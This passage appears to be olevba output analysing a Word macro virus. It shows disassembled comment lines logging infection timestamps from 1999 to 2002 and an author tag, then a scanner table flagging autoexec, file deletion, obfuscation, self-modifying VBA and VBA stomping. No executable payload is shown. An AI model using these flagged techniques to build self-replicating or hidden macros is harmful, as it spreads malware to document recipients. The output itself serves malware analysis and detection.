' Line #166:
' Line #167:
' 	QuoteRem 0x0000 0x002B " 04:19:334:19:33 PM PM-Thursday, 9 Sep 1999"
' Line #168:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #169:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #170:
' Line #171:
' Line #172:
' Line #173:
' Line #174:
' 	QuoteRem 0x0000 0x002C " 09:32:279:32:27 AM AM-Thursday, 16 Sep 1999"
' Line #175:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #176:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #177:
' Line #178:
' Line #179:
' Line #180:
' Line #181:
' 	QuoteRem 0x0000 0x002C " 01:23:111:23:11 PM PM-Wednesday, 6 Oct 1999"
' Line #182:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #183:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #184:
' Line #185:
' Line #186:
' Line #187:
' Line #188:
' 	QuoteRem 0x0000 0x0029 " 12:56:212:56:02 PM PM-Friday, 8 Oct 1999"
' Line #189:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #190:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #191:
' Line #192:
' Line #193:
' Line #194:
' Line #195:
' 	QuoteRem 0x0000 0x002B " 11:37:611:37:06 AM AM-Saturday, 9 Oct 1999"
' Line #196:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #197:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #198:
' Line #199:
' Line #200:
' Line #201:
' Line #202:
' 	QuoteRem 0x0000 0x002C " 10:43:710:43:07 PM PM-Thursday, 14 Oct 1999"
' Line #203:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #204:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #205:
' Line #206:
' Line #207:
' Line #208:
' Line #209:
' 	QuoteRem 0x0000 0x002C " 05:30:25:30:02 PM PM-Wednesday, 10 Nov 1999"
' Line #210:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #211:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #212:
' Line #213:
' Line #214:
' Line #215:
' Line #216:
' 	QuoteRem 0x0000 0x002B " 10:17:510:17:05 AM AM-Tuesday, 16 Nov 1999"
' Line #217:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #218:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #219:
' Line #220:
' Line #221:
' Line #222:
' Line #223:
' 	QuoteRem 0x0000 0x002A " 06:17:146:17:14 PM PM-Monday, 15 Nov 1999"
' Line #224:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #225:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #226:
' Line #227:
' Line #228:
' Line #229:
' Line #230:
' 	QuoteRem 0x0000 0x002C " 07:32:467:32:46 PM PM-Thursday, 18 Nov 1999"
' Line #231:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #232:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #233:
' Line #234:
' Line #235:
' Line #236:
' Line #237:
' 	QuoteRem 0x0000 0x002D " 07:06:587:06:58 PM PM-Wednesday, 24 Nov 1999"
' Line #238:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #239:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #240:
' Line #241:
' Line #242:
' Line #243:
' Line #244:
' 	QuoteRem 0x0000 0x002C " 02:38:422:38:42 AM AM-Thursday, 25 Nov 1999"
' Line #245:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #246:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #247:
' Line #248:
' Line #249:
' Line #250:
' Line #251:
' 	QuoteRem 0x0000 0x002B " 08:59:48:59:04 PM PM-Thursday, 25 Nov 1999"
' Line #252:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #253:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #254:
' Line #255:
' Line #256:
' Line #257:
' Line #258:
' 	QuoteRem 0x0000 0x0024 " 01:18:221:18:22 -Jumat, 26 Nop 1999"
' Line #259:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #260:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #261:
' Line #262:
' Line #263:
' Line #264:
' Line #265:
' 	QuoteRem 0x0000 0x002A " 07:51:287:51:28 PM PM-Monday, 29 Nov 1999"
' Line #266:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #267:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #268:
' Line #269:
' Line #270:
' Line #271:
' Line #272:
' 	QuoteRem 0x0000 0x0023 " 10:58:510:58:05 -jeudi, 2 déc 1999"
' Line #273:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #274:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #275:
' Line #276:
' Line #277:
' Line #278:
' Line #279:
' 	QuoteRem 0x0000 0x0023 " 02:11:114:11:01 -lundi, 6 déc 1999"
' Line #280:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #281:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #282:
' Line #283:
' Line #284:
' Line #285:
' Line #286:
' 	QuoteRem 0x0000 0x0024 " 06:58:1918:58:19 -mardi, 7 déc 1999"
' Line #287:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #288:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #289:
' Line #290:
' Line #291:
' Line #292:
' Line #293:
' 	QuoteRem 0x0000 0x0025 " 02:43:2714:43:27 -lundi, 13 déc 1999"
' Line #294:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #295:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #296:
' Line #297:
' Line #298:
' Line #299:
' Line #300:
' 	QuoteRem 0x0000 0x0028 " 11:10:2511:10:25 -vendredi, 17 déc 1999"
' Line #301:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #302:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #303:
' Line #304:
' Line #305:
' Line #306:
' Line #307:
' 	QuoteRem 0x0000 0x0025 " 11:47:3123:47:31 -lundi, 20 déc 1999"
' Line #308:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #309:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #310:
' Line #311:
' Line #312:
' Line #313:
' Line #314:
' 	QuoteRem 0x0000 0x0025 " 11:45:5911:45:59 -mardi, 28 déc 1999"
' Line #315:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #316:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #317:
' Line #318:
' Line #319:
' Line #320:
' Line #321:
' 	QuoteRem 0x0000 0x0028 " 03:11:2115:11:21 -vendredi, 7 janv 2000"
' Line #322:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #323:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #324:
' Line #325:
' Line #326:
' Line #327:
' Line #328:
' 	QuoteRem 0x0000 0x0026 " 04:49:2616:49:26 -jueves, 27 ene 2000"
' Line #329:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #330:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #331:
' Line #332:
' Line #333:
' Line #334:
' Line #335:
' 	QuoteRem 0x0000 0x0024 " 03:34:2415:34:24 -lunes, 7 feb 2000"
' Line #336:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #337:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #338:
' Line #339:
' Line #340:
' Line #341:
' Line #342:
' 	QuoteRem 0x0000 0x0025 " 02:24:3714:24:37 -lunes, 14 feb 2000"
' Line #343:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #344:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #345:
' Line #346:
' Line #347:
' Line #348:
' Line #349:
' 	QuoteRem 0x0000 0x0025 " 07:52:819:52:08 -sábado, 26 feb 2000"
' Line #350:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #351:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #352:
' Line #353:
' Line #354:
' Line #355:
' Line #356:
' 	QuoteRem 0x0000 0x0025 " 05:51:217:51:02 -martes, 29 feb 2000"
' Line #357:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #358:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #359:
' Line #360:
' Line #361:
' Line #362:
' Line #363:
' 	QuoteRem 0x0000 0x0024 " 05:11:2717:11:27 -lunes, 6 mar 2000"
' Line #364:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #365:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #366:
' Line #367:
' Line #368:
' Line #369:
' Line #370:
' 	QuoteRem 0x0000 0x002B " 06:35:5718:35:57  p.m.-jueves, 16 mar 2000"
' Line #371:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #372:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #373:
' Line #374:
' Line #375:
' Line #376:
' Line #377:
' 	QuoteRem 0x0000 0x0026 " 02:22:4314:22:43 -martes, 28 mar 2000"
' Line #378:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #379:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #380:
' Line #381:
' Line #382:
' Line #383:
' Line #384:
' 	QuoteRem 0x0000 0x002A " 12:33:3412:33:34  p.m.-martes, 4 abr 2000"
' Line #385:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #386:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #387:
' Line #388:
' Line #389:
' Line #390:
' Line #391:
' 	QuoteRem 0x0000 0x0029 " 02:40:514:40:05  p.m.-martes, 4 abr 2000"
' Line #392:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #393:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #394:
' Line #395:
' Line #396:
' Line #397:
' Line #398:
' 	QuoteRem 0x0000 0x002D " 02:48:214:48:02  p.m.-miércoles, 12 abr 2000"
' Line #399:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #400:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #401:
' Line #402:
' Line #403:
' Line #404:
' Line #405:
' 	QuoteRem 0x0000 0x0026 " 05:46:3917:46:39 -martes, 18 abr 2000"
' Line #406:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #407:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #408:
' Line #409:
' Line #410:
' Line #411:
' Line #412:
' 	QuoteRem 0x0000 0x002E " 10:40:5710:40:57 AM AM-Miércoles, 19 Abr 2000"
' Line #413:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #414:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #415:
' Line #416:
' Line #417:
' Line #418:
' Line #419:
' 	QuoteRem 0x0000 0x0026 " 05:21:2417:21:24 -martes, 16 may 2000"
' Line #420:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #421:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #422:
' Line #423:
' Line #424:
' Line #425:
' Line #426:
' 	QuoteRem 0x0000 0x0026 " 05:18:2317:18:23 -martes, 23 may 2000"
' Line #427:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #428:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #429:
' Line #430:
' Line #431:
' Line #432:
' Line #433:
' 	QuoteRem 0x0000 0x0025 " 10:59:2310:59:23 -lunes, 12 jun 2000"
' Line #434:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #435:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #436:
' Line #437:
' Line #438:
' Line #439:
' Line #440:
' 	QuoteRem 0x0000 0x002C " 09:37:229:37:22  a.m.-miércoles, 5 jul 2000"
' Line #441:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #442:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #443:
' Line #444:
' Line #445:
' Line #446:
' Line #447:
' 	QuoteRem 0x0000 0x002D " 12:46:5612:46:56  p.m.-miércoles, 5 jul 2000"
' Line #448:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #449:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #450:
' Line #451:
' Line #452:
' Line #453:
' Line #454:
' 	QuoteRem 0x0000 0x002A " 03:17:3415:17:34  p.m.-jueves, 6 jul 2000"
' Line #455:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #456:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #457:
' Line #458:
' Line #459:
' Line #460:
' Line #461:
' 	QuoteRem 0x0000 0x002C " 10:55:2110:55:21  a.m.-viernes, 18 ago 2000"
' Line #462:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #463:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #464:
' Line #465:
' Line #466:
' Line #467:
' Line #468:
' 	QuoteRem 0x0000 0x002B " 12:11:3012:11:30  p.m.-martes, 22 ago 2000"
' Line #469:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #470:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #471:
' Line #472:
' Line #473:
' Line #474:
' Line #475:
' 	QuoteRem 0x0000 0x0028 " 11.41.511.41.05 -miércoles, 23 ago 2000"
' Line #476:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #477:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #478:
' Line #479:
' Line #480:
' Line #481:
' Line #482:
' 	QuoteRem 0x0000 0x0029 " 09:07:99:07:09  a.m.-martes, 29 ago 2000"
' Line #483:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #484:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #485:
' Line #486:
' Line #487:
' Line #488:
' Line #489:
' 	QuoteRem 0x0000 0x0028 " 09:42:399:42:39  a.m.-lunes, 4 sep 2000"
' Line #490:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #491:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #492:
' Line #493:
' Line #494:
' Line #495:
' Line #496:
' 	QuoteRem 0x0000 0x002C " 01:14:1313:14:13  p.m.-domingo, 13 oct 2002"
' Line #497:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #498:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #499:
' Line #500:
' Line #501:
' Line #502:
' Line #503:
' 	QuoteRem 0x0000 0x002A " 11:06:611:06:06  a.m.-jueves, 26 oct 2000"
' Line #504:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #505:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #506:
' Line #507:
' Line #508:
' Line #509:
' Line #510:
' 	QuoteRem 0x0000 0x002B " 01:19:5713:19:57  p.m.-viernes, 3 nov 2000"
' Line #511:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #512:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #513:
' Line #514:
' Line #515:
' Line #516:
' Line #517:
' 	QuoteRem 0x0000 0x002D " 11:35:4111:35:41  a.m.-miércoles, 8 nov 2000"
' Line #518:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #519:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #520:
' Line #521:
' Line #522:
' Line #523:
' Line #524:
' 	QuoteRem 0x0000 0x002D " 09:47:249:47:24  a.m.-miércoles, 29 nov 2000"
' Line #525:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #526:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #527:
' Line #528:
' Line #529:
' Line #530:
' Line #531:
' 	QuoteRem 0x0000 0x0028 " 08:48:248:48:24  a.m.-lunes, 4 dic 2000"
' Line #532:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #533:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #534:
' Line #535:
' Line #536:
' Line #537:
' Line #538:
' 	QuoteRem 0x0000 0x002C " 12:24:1012:24:10  p.m.-viernes, 15 dic 2000"
' Line #539:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #540:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #541:
' Line #542:
' Line #543:
' Line #544:
' Line #545:
' 	QuoteRem 0x0000 0x0026 " 04:26:3316:26:33 -sábado, 26 may 2001"
' Line #546:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #547:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #548:
' Line #549:
' Line #550:
' Line #551:
' Line #552:
' 	QuoteRem 0x0000 0x0028 " 01:33:1913:33:19 -miércoles, 5 sep 2001"
' Line #553:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #554:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #555:
' Line #556:
' Line #557:
' Line #558:
' Line #559:
' 	QuoteRem 0x0000 0x0027 " 01.50.1213.50.12 -viernes, 14 sep 2001"
' Line #560:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #561:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #562:
' Line #563:
' Line #564:
' Line #565:
' Line #566:
' 	QuoteRem 0x0000 0x0024 " 06:38:518:38:05 -lunes, 24 sep 2001"
' Line #567:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #568:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #569:
' Line #570:
' Line #571:
' Line #572:
' Line #573:
' 	QuoteRem 0x0000 0x0029 " 05:20:45:20:04 PM PM-Monday, 19 Nov 2001"
' Line #574:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #575:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #576:
' Line #577:
' Line #578:
' Line #579:
' Line #580:
' 	QuoteRem 0x0000 0x002F " 02:14:3514:14:35  <(©¿©)>-Tuesday, 20 Nov 2001"
' Line #581:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #582:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #583:
' Line #584:
' Line #585:
' Line #586:
' Line #587:
' 	QuoteRem 0x0000 0x002A " 01:40:391:40:39 PM PM-Friday, 20 Apr 2001"
' Line #588:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #589:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #590:
' Line #591:
' Line #592:
' Line #593:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

